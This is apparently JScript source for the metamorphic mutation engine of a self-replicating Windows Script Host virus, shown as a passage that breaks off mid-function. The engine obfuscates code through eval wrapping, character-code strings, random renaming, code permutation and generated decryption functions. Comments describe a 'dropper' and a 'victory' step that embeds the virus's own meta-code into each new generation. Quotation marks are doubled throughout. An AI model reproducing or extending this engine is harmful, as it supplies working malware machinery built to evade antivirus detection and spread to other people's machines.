function GetVariableList(CodeStringWithMask)  // fGetVariableList 
{    
    var VarListRV="""";
    while(CodeStringWithMask.indexOf('°+')!=-1)   // collect variables in this code line
    {
        VarListRV+=CodeStringWithMask.substring(CodeStringWithMask.indexOf('°+'),CodeStringWithMask.indexOf('+°')+2)+"",""; // (ccc)
        CodeStringWithMask=CodeStringWithMask.replace('°+','');
        CodeStringWithMask=CodeStringWithMask.replace('+°','');
    }
    return(""_*_*""+VarListRV.substring(0,VarListRV.length-1)+""*_*_"")
}



function RemoveVariableIndicator(CodeStringWithMask)  // fRemoveVariableIndicator
{    
    while(CodeStringWithMask.indexOf('_*_*')!=-1)
    {
        CodeStringWithMask=CodeStringWithMask.substring(0,CodeStringWithMask.indexOf('_*_*'))+CodeStringWithMask.substring(CodeStringWithMask.indexOf('*_*_')+4);
    }
    return(CodeStringWithMask);
}


function DeriveRestrictVC(arg,probalility,novars)  // fDeriveRestrictVC   
{
    var WhichRnd=Math.floor(Math.random()*probalility)
    if(arg.toString().indexOf(""eval("")!=-1){WhichRnd+=7;}      
    if(WhichRnd>10)
    {
        return(arg);
    }
    
    var RndString=randomString();
    if(WhichRnd>8&&novars!=1)
    {
        if(r(2)==0)
        {
            DeriveRestrString+=""var ""+RndString+'='+arg+'@;';
        }
        else
        {
            DeriveRestrString=""var ""+RndString+'='+arg+'@;'+DeriveRestrString;
        }
        return(RndString);
    }
    if(WhichRnd>6) // VC -> value
    {
        var VariableString=GetVariableList(arg.toString())
        arg=RemoveVariableMask(arg.toString());
        arg=RemoveVariableIndicator(arg);
        return('eval('+CreateString(arg)+')'+VariableString);
    }  
    var VariableList=[];
    var VariableListRnd=[];
    arg=CreateVariableListForFunctionCalls(arg,VariableList,VariableListRnd)
    FunctionNames.push(RndString);
    FunctionArgs.push('('+VariableListRnd.join()+')');
    FunctionDefs.push('return '+arg);
    var ReturnValue=VariableList.join('+°,°+');
    if(VariableList.length>0)
    {
        ReturnValue='°+'+ReturnValue+'+°';
    }
    return(RndString+'('+ReturnValue+')');
}



function CreateVariableListForFunctionCalls(CodeString,VarArrOrig,VarArrRnd)  // fCreateVariableListForFunctionCalls
{
    CopyexecCode=CodeString.toString();
    while(CopyexecCode.indexOf('°+')!=-1)   // collect variables in this code line
    {
        VarArrOrig.push(CopyexecCode.substring(CopyexecCode.indexOf('°+')+2,CopyexecCode.indexOf('+°')));
        CopyexecCode=CopyexecCode.substring(CopyexecCode.indexOf('+°')+2);
    }
    for(var i=0;i<VarArrOrig.length;i++)    // remove every variable with a new argument-name
    {
        var RandNameForFuncArg=randomString();
        VarArrRnd.push(RandNameForFuncArg);
        while(CodeString.indexOf(VarArrOrig[i])!=-1)
        {
            CodeString=CodeString.replace(VarArrOrig[i],RandNameForFuncArg);
        }
    }
    return(CodeString);
}


function CreateExecution(execCode,noFunctionCreation)  // fCreateExecution        
{
    var RNum4=Math.floor(Math.random()*8);

    if(noFunctionCreation==1)
    {
        RNum4=Math.floor(Math.random()*5);
    }
   
    if(RNum4<2)
    {
        return(execCode);
    }
    
    if(RNum4<5&&execCode.substring(0,7)!='return(')
    {        
        var VariableString=GetVariableList(execCode)
        execCode=RemoveVariableMask(execCode);
        execCode=RemoveVariableIndicator(execCode);                          
        return('eval('+CreateString(execCode)+')'+VariableString);
    }
    
    if(execCode.indexOf(""eval("")!=-1){return(execCode);}
    
    var Rname5=randomString();

    if(RecordFunctionVariables==0)  // first initialisation
    {
        RecordFunctionFN=FunctionNames.length;
        RecordFunctionVN=VarNames.length;     
        FunctionVariableFctName.push(Rname5);
    }
    RecordFunctionVariables++;

    var VariableList=[];
    var VariableRndList=[];
    execCode=CreateVariableListForFunctionCalls(execCode,VariableList,VariableRndList)

    FunctionDefs.push(CreateExecution(execCode));
    FunctionNames.push(Rname5);
    FunctionArgs.push('('+VariableRndList.join()+')');
    RecordFunctionVariables--;

    if(RecordFunctionVariables==0)  // final summing up of variable/function names
    {
        RecordFctNames=FunctionNames.slice(RecordFunctionFN);
        RecordVarNames=VarNames.slice(RecordFunctionVN);
        FunctionVariableNameArray.push(RecordVarNames.concat(RecordFctNames));
    }

    var ReturnValue=VariableList.join('+°,°+');
    if(VariableList.length>0)
    {
        ReturnValue='°+'+ReturnValue+'+°';
    }

    if(execCode.substring(0,7)=='return(')
    {
        return('return '+Rname5+'('+ReturnValue+')')
    }

    return(Rname5+'('+ReturnValue+')');
}


function CreateString(plainString)  // fCreateString
{
    var InString=plainString;
    var RNum6=Math.floor(Math.random()*InString.length/6);
    if(InString.length>1000)               // new
    {
        RNum6=Math.floor(Math.random()*InString.length/50);
    }
    for(i=0;i<RNum6;i++)
    {
        RNum7=Math.floor(Math.random()*InString.length);
        InString=InString.substring(0,RNum7)+'@@'+InString.substring(RNum7);
    }
    while(InString.indexOf('@@@@')!=-1)    // just in 1st gen... may it help??
    {
        InString=InString.replace('@@@@','@@');
    }
    var SplitStr=InString.split('@@');
    var RVstring='';
    for(var j=0;j<SplitStr.length;j++)
    {
        var RNum8=Math.floor(Math.random()*20);
        RNum8=1;  // *** debug
        if(RNum8<5)
        {
            while(SplitStr[j].indexOf(s(39))!=-1)
            {
                SplitStr[j]=SplitStr[j].replace(s(39),s(35)+s(35)+s(35)+'+String.fromCharCode(39)+'+s(35)+s(35)+s(35))   // new             
            }
            while(SplitStr[j].indexOf(s(35)+s(35)+s(35))!=-1)            // new
            {
                SplitStr[j]=SplitStr[j].replace(s(35)+s(35)+s(35),s(39))       // new         
            }
            RVstring+=s(39)+SplitStr[j]+s(39)+'+';
        }
        if(RNum8>4&&RNum8<8)
        {
            var Rname6=randomString();
            VarDefs.push(CreateString(SplitStr[j]));
            VarNames.push(Rname6);
            RVstring+=DeriveVC(Rname6,24)+'+';
        }        
        if(RNum8>7)
        {
            var TmpCharCode='';
            for(k=0;k<SplitStr[j].length;k++)
            {
                TmpCharCode+=CreateNumeric(SplitStr[j].charCodeAt(k))+',';
            }
            TmpCharCode=TmpCharCode.substr(0,TmpCharCode.length-1);                     
            RVstring+='String.fromCharCode('+TmpCharCode+')+';
        }
    }
    return(RVstring.substring(0,RVstring.length-1));
}


function PreCompilation()  // fPreCompilation - not a function anymore
{
    // Make random bruteforce decryption functions

    FullArray=[];    
    for(var FillA=0;FillA<256;FillA++)
    {
        FullArray.push([FillA]);
    }
    
    for(var NumberOfFunctionCreation=0;NumberOfFunctionCreation<75;NumberOfFunctionCreation++)
    {
        F='(SOS)O(SOS)';
        while(F.indexOf('S')!=-1)
        {
            if(r(4)==0)
            {
                F=F.replace('S','(SOS)')
            }
            else
            {
                F=F.replace('S','X');
            }
        }
        
        while(F.indexOf('O')!=-1)
        {
            var OperatorArray=['+','+','-','-','*','%']
            F=F.replace('O',OperatorArray[r(6)]);
        }
        
        var FunctionArguments=[];
        var FunctionArgLength=r(4)+2;
        for(var RSc=0;RSc<FunctionArgLength;RSc++)
        {
            FunctionArguments.push(randomString());
        }
        
        while(F.indexOf('X')!=-1)
        {
            if(r(2)==0)
            {   
                F=F.replace('X',FunctionArguments[r(FunctionArguments.length)]);
            }
            else
            {
                F=F.replace('X',r(256));
            }
        }
        
        for(var VarCount=FunctionArguments.length;VarCount>=0;VarCount--)
        {
            if(F.indexOf(FunctionArguments[VarCount])==-1)
            {
                FunctionArguments.splice(VarCount,1);
            }
        }
        
        if(FunctionArguments.length>0)
        {
            var Fname=randomString();
            G='function '+Fname+'('+FunctionArguments.join()+'){return('+F+');}';
        
            eval(G);   
            var IsItAUsefulFunction=0;
            
            for(var EvalFctC=0;EvalFctC<100;EvalFctC++)
            {
                FFilledArguments=[]
                for(var FFc=0;FFc<FunctionArguments.length;FFc++)
                {
                    FFilledArguments.push(r(256))    
                }
                
                FCall=Fname+'('+FFilledArguments.join()+')';

                FResult=eval(FCall);   
                if(FResult>=0&&FResult<256)
                {
                    IsItAUsefulFunction=1;
                    FullArray[FResult].push(FCall);
                }
            }
            
            if(IsItAUsefulFunction==1)
            {
                FunctionDefs.push('return '+F);
                FunctionArgs.push('('+FunctionArguments.join()+')');  
                FunctionNames.push(Fname); 
            }
        }
    }   

    // Make some instruction definition
    while(MetaLevelLanguage.indexOf(""$CreateObject$"")!=-1)
    {
        if(Math.floor(Math.random()*2)==0)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(""$CreateObject$"",""WScript#.CreateObject"");
        }
        else
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(""$CreateObject$"",""new ActiveXObject"");
        }
    }
    
      
    // Define random variable names 
    /*
    // This feature should not be activated in the 0th-generation dropper
    // because it might interfere with the ""victory""-instruction, which is
    // responsible for including the metacode to the next generation. Therefor the
    // dropped output can can still be understood relatively simple (you can
    // compare the used variables with the variables in the meta-code and understand
    // further the code - this is how i did the first stage of bug-fixing), so it can
    // be used to learn about the mutations in general. This feature is just
    // deactivated in this 0-generation dropper - everything is fully activated
    // in every further generation. (in fact this is no fundamental problem, but
    // it could be solved relativly quick. but i'm just to lazy to optimize the
    // dropper :))    
    var CopyMetaLevelLanguage=MetaLevelLanguage;
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')var',')def');
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(var',')while(');   // also consider while(var VariableName=...)     
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(',')def');  
    while(CopyMetaLevelLanguage.indexOf(')def ')!=-1)
    {
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf(')def ')+1);
        var VariableNameGlobal=CopyMetaLevelLanguage.substring(4,CopyMetaLevelLanguage.indexOf('='));
        var RandomVariableName=randomString();
        while(MetaLevelLanguage.indexOf(VariableNameGlobal)!=-1)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(VariableNameGlobal,RandomVariableName);
        }
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')var',')def');
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(var',')while(');
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(',')def');
    }
    // Define random function names
    var CopyMetaLevelLanguage=MetaLevelLanguage;
    while(CopyMetaLevelLanguage.indexOf(')function ')!=-1)
    {
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf(')function ')+1);
        var FunctionName=CopyMetaLevelLanguage.substring(9,CopyMetaLevelLanguage.indexOf('('));
        var RandomVariableName=randomString();
        while(MetaLevelLanguage.indexOf(FunctionName)!=-1)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(FunctionName,RandomVariableName);
        }
        FctArguments=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf('(')+1,CopyMetaLevelLanguage.indexOf(')'));
        var SingleFArguments="""";
        if(FctArguments.length>0)
        {
            SingleFArguments=FctArguments.split(',');
        }
        for(var i=0;i<SingleFArguments.length;i++)
        {
            var RandomVariableNameArgs=randomString();
            while(MetaLevelLanguage.indexOf(SingleFArguments[i])!=-1)
            {
                MetaLevelLanguage=MetaLevelLanguage.replace(SingleFArguments[i],RandomVariableNameArgs);
            }
        }
    } */
}


function Permutator(MLL)  // fPermutator
{
    var InfoCodeArray=[];
    var PermIdentifier=[];
    var RequiredCodes=[];
    var MLLcount=0;
    for(var i=0; MLLcount<MLL.length; i++)
    {   
        PermIdentifier[i]=MLL[MLLcount].substring(MLL[MLLcount].indexOf('(')+1,MLL[MLLcount].indexOf('|'));
        RequiredCodes[i]=MLL[MLLcount].substring(MLL[MLLcount].indexOf('|')+1,MLL[MLLcount].indexOf(')'));
        InfoCodeArray[i]=[];
        InfoCodeArray[i][0]=MLL[MLLcount].substring(MLL[MLLcount].indexOf(')')+1);
        if(InfoCodeArray[i][0].substring(0,2)=='if')
        {
            var NumberOfLinesIf=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);
            InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesIf+1)));
            MLLcount=MLLcount+NumberOfLinesIf+1;      // pointer to else-line (which contains the number of elements contained in else)
            
            var NumberOfLinesElse=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);            
            //WScript.Echo(""MLL: ""+ MLL+nnn+nnn+""NumberOfLinesIf: ""+NumberOfLinesIf+nnn+""MLL[MLLcount]: ""+MLL[MLLcount]+nnn+""NumberOfLinesElse: ""+NumberOfLinesElse+nnn+""MLLcount: ""+MLLcount)

            InfoCodeArray[i]=InfoCodeArray[i].concat(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1));   // add the else-number part
            if(NumberOfLinesElse>0)  // if there are lines in the else-part, add them
            {
                InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesElse+1)));
            }
            MLLcount=MLLcount+NumberOfLinesElse;
        }
        if(InfoCodeArray[i][0].substring(0,5)=='while')
        {
            var NumberOfLinesWhile=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);
            InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesWhile+1)));
            MLLcount=MLLcount+NumberOfLinesWhile;
        }
        if(InfoCodeArray[i][0].substring(0,9)=='function ')
        {
            var NumberOfLinesFunction=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);
            InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesFunction+1)));
            MLLcount=MLLcount+NumberOfLinesFunction;
        }
        MLLcount++;
    }
    RequiredCodes.push();
    var PermutatedCodeArray=[];
    while(InfoCodeArray.length>0)
    {
        var RandomElement=r(InfoCodeArray.length);     
        if(RequiredCodes.toString().indexOf(PermIdentifier[RandomElement])==-1)
        {
            PermutatedCodeArray=InfoCodeArray[RandomElement].concat(PermutatedCodeArray);
            InfoCodeArray.splice(RandomElement,1);
            PermIdentifier.splice(RandomElement,1);
            RequiredCodes.splice(RandomElement,1);
        }
    }
    return(PermutatedCodeArray.slice())
}


function CreateObjectExecution(InputObject)  // fCreateObjectExecution
{
    while(InputObject.indexOf(s(35)+s(79))!=-1)  // #ON
    {
        var ObjectNumber=InputObject.charAt(InputObject.indexOf(s(35)+s(79))+2)
        var FullObject=InputObject.substring(InputObject.indexOf(s(35)+s(79))+3,InputObject.indexOf(ObjectNumber+s(79)+s(35)));
        InputObject=InputObject.substring(0,InputObject.indexOf(s(35)+s(79)))+CreateObjectExecution(FullObject)+InputObject.substring(InputObject.indexOf(ObjectNumber+s(79)+s(35))+3);
    }
    while(InputObject.indexOf(s(35)+s(46))!=-1)
    {
        if(Math.floor(Math.random()*3)==0)            // object.method() -> f().methode()
        {   
            var ObjectName=randomString();
            
            var VariableList=[];
            var VariableListRnd=[];
            var ObjString=InputObject.substring(0,InputObject.indexOf(s(35)+s(46)));
            while(ObjString.indexOf(s(35)+s(120))!=-1)
            {
                var COEexecNum=ObjString.charAt(ObjString.indexOf(s(35)+s(120))+2);
                ObjString=ObjString.replace(s(35)+s(120)+COEexecNum,"""");        // remove the #xN and Nx#
                ObjString=ObjString.replace(COEexecNum+s(120)+s(35),"""");
            }
            ObjString=CreateVariableListForFunctionCalls(ObjString,VariableList,VariableListRnd)
            FunctionDefs.push('return '+ObjString);
            FunctionNames.push(ObjectName); 
            FunctionArgs.push('('+VariableListRnd.join()+')');
            
            var ReturnValue=VariableList.join('+°,°+');
            if(VariableList.length>0)
            {
                ReturnValue='°+'+ReturnValue+'+°';
            }
            InputObject=CreateObjectExecution(ObjectName+'('+ReturnValue+')'+InputObject.substring(InputObject.indexOf(s(35)+s(46))+1));
        }
        else
        {
            InputObject=CreateObjectExecution(InputObject.replace(s(35)+s(46),s(46)));           
        }
    }
    return(InputObject);    
}


function ExecutionParser(ExecString)  // fExecutionParser
{
    while(ExecString.indexOf(s(35)+s(120))!=-1)  // #xN
    {
        var ExecutionNumber=ExecString.charAt(ExecString.indexOf(s(35)+s(120))+2)
        //WScript.Echo(""#x""+ExecutionNumber+nnn+nnn+ExecString)
        DeriveRestrString="""";
        var newExecutionToReplace=ExecString.substring(ExecString.indexOf(s(35)+s(120))+3,ExecString.indexOf(ExecutionNumber+s(120)+s(35)));
        ExecString=ExecString.substring(0,ExecString.indexOf(s(35)+s(120)))+DeriveRestrictVC(ExecutionParser(newExecutionToReplace),100,1)+ExecString.substring(ExecString.indexOf(ExecutionNumber+s(120)+s(35))+3);
    }
    return(ExecString)
}


function CreateBlockOfCode(CodeBlockArray)  // fCreateBlockOfCode
{
    var RString='';
    var CodeLineIndex=0;
    var LocalVarName=[];
    var LocalVarDefs=[];
    HierarchyOfCalls++;
    while(CodeLineIndex<CodeBlockArray.length)
    {        
        var SingleElement=CodeBlockArray[CodeLineIndex];
        while(SingleElement.indexOf(s(35)+s(34))!=-1)  // #""                             
        {
            var newStringToReplace=SingleElement.substring(SingleElement.indexOf(s(35)+s(34))+2,SingleElement.indexOf(s(34)+s(35)));
            SingleElement=SingleElement.substring(0,SingleElement.indexOf(s(35)+s(34)))+CreateString(newStringToReplace)+SingleElement.substring(SingleElement.indexOf(s(34)+s(35))+2);
        }
        while(SingleElement.indexOf(s(35)+s(110))!=-1)  // #n
        {
            var newNumberStart=SingleElement.indexOf(s(35)+s(110))+2;                                                               // this line is worth 3h of bug searching :)
            var newNumberToReplace=SingleElement.substring(newNumberStart,SingleElement.indexOf(s(110)+s(35),newNumberStart));      
            SingleElement=SingleElement.substring(0,SingleElement.indexOf(s(35)+s(110)))+CreateNumeric(newNumberToReplace)+SingleElement.substring(SingleElement.indexOf(s(110)+s(35),newNumberStart)+2);
        }
        SingleElement=CreateObjectExecution(SingleElement);
        SingleElement=ExecutionParser(SingleElement);   
        if(SingleElement.substring(0,2)=='if')
        {
            //if(var1!var2?operator)NNN Code NNN AntiCode
            //if(i!2?==)002
            //WScript.Echo(""i==1"");    // in case of i==1
            //WScript.Echo(""second line"");
            //003
            //WScript.Echo(""i!=1""); // in case of i!=1
            //WScript.Echo(""2"");
            //WScript.Echo(""3"");
            var condition             =SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.lastIndexOf(')'));
            var NumOfElementsCode     =parseInt(SingleElement.substring(SingleElement.lastIndexOf(')')+1),10);            
            var NumOfElementsAntiCode =parseInt(CodeBlockArray[CodeLineIndex+NumOfElementsCode+1],10);

            var ExecuteCode=CodeBlockArray.slice(CodeLineIndex+1,CodeLineIndex+NumOfElementsCode+1);
            var AntiCode   =CodeBlockArray.slice(CodeLineIndex+NumOfElementsCode+2,CodeLineIndex+NumOfElementsCode+NumOfElementsAntiCode+2);

            var LogicOperator =SingleElement.substring(SingleElement.indexOf('?')+1,SingleElement.lastIndexOf(')'));
            if(LogicOperator=='=='&&Math.floor(Math.random()*4)!=0)
            {
                var argument1     =SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.indexOf('!'));
                var argument2     =SingleElement.substring(SingleElement.indexOf('!')+1,SingleElement.indexOf('?'));
                var defcode='';
                if(AntiCode.length>0)
                {
                    defcode+='default:!@{'+CreateBlockOfCode(AntiCode)+'!@};break;'
                }
                RString+='switch('+argument1+')@{case '+argument2+':!@{'+CreateBlockOfCode(ExecuteCode)+';break;!@}'+defcode+'@}';                   
            }
            else
            {
                var elsecodeinclude='';
                if(AntiCode.length>0)
                {
                    elsecodeinclude='else@{'+CreateBlockOfCode(AntiCode)+'@}';
                }        
                var tmpLL=CreateLogic(condition)
                RString+=DeriveRestrString+'if('+tmpLL+')@{'+CreateBlockOfCode(ExecuteCode)+'@}'+elsecodeinclude; 
            }
            CodeLineIndex+=NumOfElementsCode+NumOfElementsAntiCode+2;
        }
        
        if(SingleElement.substring(0,5)=='while')
        {
            //while(initial$var1!var2?operator@action)NNNCode
            //
            //while(i=0$i!3?<@i=i+1)002
            //WScript.Echo(""hrhr""+i);         // this will be loop'ed
            //WScript.Echo(""second output that loops"");
            var initial           =SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.indexOf('$'));
            var condition         =SingleElement.substring(SingleElement.indexOf('$')+1,SingleElement.indexOf('@'));
            var action            =SingleElement.substring(SingleElement.indexOf('@')+1,SingleElement.lastIndexOf(')'));
            var NumOfElementsCode =parseInt(SingleElement.substring(SingleElement.lastIndexOf(')')+1),10);  
            var ExecuteCode       =CodeBlockArray.slice(CodeLineIndex+1,CodeLineIndex+NumOfElementsCode+1);

            var RNum2=Math.floor(Math.random()*2);
            NoDerivation1=1;
            var RLogic=CreateLogic(condition)
            NoDerivation1=0;
            if(RNum2==0)
            {
                if(initial.length>0)
                {
                    LocalVarName.push(initial.substring(4,initial.indexOf('=')));                    
                    LocalVarDefs.push(initial.substring(initial.indexOf('=')+1));
                }
                RString+=DeriveRestrString+'while('+RLogic+')';
                RString+='@{'+CreateBlockOfCode(ExecuteCode);
                if(action.length>0)
                {
                    RString+=CreateExecution(action,1);
                }
                RString+='@}';
            }
            if(RNum2==1)
            {
                NoDerivation1=1;
                RString+=DeriveRestrString+'for('+initial+';'+RLogic+';'+action+')';                
                NoDerivation1=0;
                RString+='@{'+CreateBlockOfCode(ExecuteCode)+'@}';
            }
            CodeLineIndex+=NumOfElementsCode+1;
        }
        
        if(SingleElement.substring(0,1)=='c')
        {
            //cX1(var)
            //cXn(var1, var2)
            //c+s(string1, string2)
            // X=+/- plus/minus        
            var CalcCode='';

            if(SingleElement.substring(2,3)=='1')
            {
                var Variable1=SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.lastIndexOf(')'));
                var Variable2=1;
                if(Math.floor(Math.random()*3)==0)
                {
                    CalcCode=Variable1+'@@';
                }
            }
            else
            {
                var Variable1=SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.indexOf(','));
                var Variable2=SingleElement.substring(SingleElement.indexOf(',')+1,SingleElement.lastIndexOf(')'));                
            }
            DeriveRestrString='';            
            if(CalcCode=='')
            {
                var WhichCalc=Math.floor(Math.random()*2)
                if(WhichCalc==0)
                {
                    CalcCode=Variable1+'@='+DeriveRestrictVC(Variable2,20);
                }
                else
                {
                    if(SingleElement.substring(2,3)=='n'&&Math.floor(Math.random()*2)==0)
                    {
                        CalcCode=Variable1+'='+DeriveRestrictVC(Variable2,30)+'@'+DeriveRestrictVC(Variable1,30);
                    }
                    else
                    {
                        CalcCode=Variable1+'='+DeriveRestrictVC(Variable1,30)+'@'+DeriveRestrictVC(Variable2,30);
                    }
                }
            }
            var PMOperator=SingleElement.substring(1,2);
            CalcCode=CalcCode.replace(/@/g,PMOperator);
            RString+=DeriveRestrString+CalcCode+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,1)=='x')
        {
            //xCode
            //xWScript.Echo(""ExecuteMe!"");        
            var ExecuteableCode=SingleElement.substring(1);
            RString+=CreateExecution(ExecuteableCode)+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,1)=='y')
        {
            //yCode
            //yXXX=something
            // mainly for changing variables
            var ExecuteableCode=SingleElement.substring(1);
            RString+=CreateExecution(ExecuteableCode,1)+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,4)=='def ')
        {
            // def variable=something
            
            
            //var SingleVariableName=SingleElement.substring(4,SingleElement.indexOf('='));   // Old methode, makes too much problems, and seems to be redundant in the new permutator process
            //var SingleVariableDef=SingleElement.substring(SingleElement.indexOf('=')+1);
            //VarNames.push(SingleVariableName);
            //VarDefs.push(SingleVariableDef);    
    
            var dExecuteableCode=SingleElement.substring(4);
            RString+=CreateExecution(dExecuteableCode,0)+'@;'+s(13)+s(10)
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,4)=='var ')
        {
            // def variable=something
            //var PreSingleVariableName=SingleElement.substring(0,SingleElement.indexOf('='));
            //var SingleVariableDef=SingleElement.substring(SingleElement.indexOf('=')+1);
            RString+=CreateExecution(SingleElement,1)+'@;'+s(13)+s(10)
            //LocalVarName.push(SingleVariableName); // Old Methode
            //LocalVarDefs.push(SingleVariableDef);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,9)=='function ')
        {
            //function abc(arg1,arg2)001__xWScript.Echo(arg1)

            var functionname      =SingleElement.substring(9,SingleElement.indexOf('('));
            var functionarguments =SingleElement.substring(SingleElement.indexOf('('),SingleElement.indexOf(')')+1);
            var NumOfElementsCode =parseInt(SingleElement.substring(SingleElement.indexOf(')')+1),10);
            var ExecuteCode       =CodeBlockArray.slice(CodeLineIndex+1,CodeLineIndex+NumOfElementsCode+1);
            FunctionDefs.push(CreateBlockOfCode(ExecuteCode))
            FunctionArgs.push(functionarguments);
            FunctionNames.push(functionname);          
            CodeLineIndex+=NumOfElementsCode+1;
        }
        if(SingleElement.substring(0,7)=='victory')
        {
            //victory
            // binds the source to the compiler

            if(Math.round(Math.random()*2)>0)
            {
                RString+='var ';
            }
            WScript.Echo(""in victory1: ""+MetaLevelLanguage.length)
            while(OriginalMetaCode.indexOf(""°+"")!=-1)
            {
                OriginalMetaCode=OriginalMetaCode.replace(""°+"",""(-:"");
                OriginalMetaCode=OriginalMetaCode.replace(""+°"","":-)"");  // Happy code is happy :)                
            }
            WScript.Echo(""in victory2: ""+MetaLevelLanguage.length)
            RString+='sMetaLevelLanguage='+CreateString(OriginalMetaCode)+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }
    }
    HierarchyOfCalls--;
    // include local variables
    LocalVarName.reverse();
    LocalVarDefs.reverse();
    while(LocalVarName.length>0)
    {
        var FirstPos=RString.indexOf(LocalVarName[0]);
        var PotentialPos=FindPositionForCode(RString,FirstPos);
        var CodeVarIntegrate='var '+LocalVarName[0]+'='+LocalVarDefs[0]+'@;'
        LocalVarName.splice(0,1);
        LocalVarDefs.splice(0,1);
        NewVarPos=PotentialPos[Math.floor(Math.random()*PotentialPos.length)];
        RString=RString.substring(0,NewVarPos)+CodeVarIntegrate+RString.substring(NewVarPos);
    }
    if(HierarchyOfCalls!=0)
    {
        while(RString.indexOf('@;')!=-1){RString=RString.replace('@;',';'+nnn);}
        while(RString.indexOf('@;')!=-1){RString=RString.replace('@',nnn);}
    }
    if(RString==''){WScript.Echo(""RString !!is empty!""+String.fromCharCode(13,10)+CodeBlockArray);} // Debugging info
    return(RString);
}


function CalculateFirstAppearance(OriginalCode,ObjectName)
{
    ObjectPlace=OriginalCode.indexOf(ObjectName);
    if (ObjectPlace==-1)
    {
        GetFunctionN=-1;
        for(n=0;n<FunctionVariableNameArray.length;n++)
        {
            for(m=0;m<FunctionVariableNameArray[n].length;m++)
            {
                if(FunctionVariableNameArray[n][m]==ObjectName){GetFunctionN=n;}
            }
        }
        ObjectPlace=OriginalCode.indexOf(FunctionVariableFctName[GetFunctionN]);
    }
    return(ObjectPlace)
}


function FindPositionForCode(OriginalCode,PosTrace)
{
    var OrigPosTrace=PosTrace;
    var VPosArray=[];
    while(SKPlace!=-1)
    {
        var SKPlace =OriginalCode.lastIndexOf('@;',PosTrace-1);
        var BraPlace=OriginalCode.lastIndexOf('@{',PosTrace-1);
        var KetPlace=OriginalCode.lastIndexOf('@}',PosTrace-1);
        var PosTrace=Math.max(SKPlace,BraPlace,KetPlace);
        if(PosTrace==SKPlace&&SKPlace!=-1)
        {
            VPosArray.push(SKPlace+2);
        }
        if(PosTrace==KetPlace&&PosTrace!=-1)
        {
            FoundKet=1;
            while(FoundKet>0)
            {
                BraPlace=OriginalCode.lastIndexOf('@{',PosTrace-1);
                KetPlace=OriginalCode.lastIndexOf('@}',PosTrace-1);
                if(BraPlace>KetPlace)
                {
                    FoundKet--;
                    PosTrace=BraPlace;
                }
                else
                {
                    FoundKet++;
                    PosTrace=KetPlace;
                }
            }
        }
    }
    VPosArray.push(0);
    return(VPosArray);
}


function CreateVarsAndFuncts(OriginalCode)  // fCreateVarsAndFuncts
{
    TmpVarNames=VarNames.slice();       // save to make function-arrays out of it
    while(VarDefs.length>0)
    {
        NextPlace=CalculateFirstAppearance(OriginalCode,VarNames[0]);
        CodeToIntegrate=VarNames[0]+'='+VarDefs[0]+'@;'
        VarDefs.splice(0,1);
        VarNames.splice(0,1);
        VariablePosArray=FindPositionForCode(OriginalCode,NextPlace);
        NewPos=VariablePosArray[Math.floor(Math.random()*VariablePosArray.length)];
        OriginalCode=OriginalCode.substring(0,NewPos)+CodeToIntegrate+OriginalCode.substring(NewPos);
    }
    NumberOfArrays=Math.floor(Math.random()*TmpVarNames.length/5);
    NumberOfArrays=0;
    for(k=0;k<NumberOfArrays;k++)
    {
        RandNameArr=randomString();
        TmpVarNames=TmpVarNames.sort(RandomizeFunction);   // Special way to randomize an array
        NumberOfArrayEntries=Math.floor(Math.random()*TmpVarNames.length);        
        CodeToIntegrate=RandNameArr+'=[';
        ArrayIndexCounter=0;
        for(i=0;i<NumberOfArrayEntries;i++)
        {
            SearchArrayEntries1=OriginalCode.indexOf(TmpVarNames[i]);
            if(SearchArrayEntries1!=-1)    // first appearance (definition)
            {
                SearchArrayEntries2=OriginalCode.indexOf(TmpVarNames[i],SearchArrayEntries1+1);
                if(SearchArrayEntries2!=-1)    // variable definition (useage)
                {
                    SearchArrayEntries3=OriginalCode.indexOf(TmpVarNames[i],SearchArrayEntries2+1);
                    if(SearchArrayEntries3==-1)    // variable definition (no third one)
                    {
                        SearchArrayEntries4=OriginalCode.indexOf(TmpVarNames[i]+'=');
                        VariableDefinition=OriginalCode.substring(SearchArrayEntries4+TmpVarNames[i].length+1,OriginalCode.indexOf('@;',SearchArrayEntries4));

                        if(Math.random()*4<3)
                        {
                            // function array
